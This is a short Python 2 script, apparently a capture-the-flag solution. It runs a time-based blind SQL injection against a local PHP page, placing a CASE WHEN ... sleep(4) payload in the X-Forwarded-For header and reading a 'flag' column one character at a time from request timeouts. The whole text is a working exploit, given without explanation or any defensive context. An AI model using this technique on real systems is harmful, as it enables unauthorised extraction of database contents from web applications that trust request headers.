import requests
import string
url="http://127.0.0.1:801/INSET_INTO.php"
allString=string.lowercase + string.uppercase + string.digits +"_"+"{}"
result=""

for i in range(1,33):
    for str1 in allString:
        data="11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(4) else 1 end ) and '1'='1".format(str(i),str1)
    
        headers={"x-forwarded-for":data}
        try:
            res=requests.get(url,headers=headers,timeout=3)
        except requests.exceptions.ReadTimeout, e:
            result += str1
            print result
            break
print  'result:' + result